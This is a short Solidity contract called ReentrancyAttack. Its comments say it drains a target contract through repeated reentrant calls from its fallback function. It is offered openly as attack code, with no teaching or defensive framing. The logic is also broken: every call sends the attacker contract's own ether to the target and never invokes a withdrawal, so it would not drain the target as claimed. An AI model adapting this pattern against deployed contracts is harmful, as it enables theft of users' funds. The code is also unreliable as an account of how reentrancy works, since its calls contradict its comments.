// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

contract ReentrancyAttack {
    address payable public target;
    uint256 public amountToDrain;

    // Constructor to set the target contract and amount to drain per reentrant call
    constructor(address payable _target, uint256 _amountToDrain) {
        target = _target;
        amountToDrain = _amountToDrain;
    }

    // Initiates the attack
    function initiateAttack() public payable {
        require(msg.value >= amountToDrain, "Insufficient funds for attack");

        // Start the attack by calling the vulnerable function
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Initial call failed");
    }

    // Fallback function that will be called repeatedly during the attack
    fallback() external payable {
        if (address(target).balance >= amountToDrain) {
            // Continue the attack as long as there is enough balance
            (bool success, ) = target.call{value: amountToDrain}("");
            require(success, "Reentrant call failed");
        }
    }
}
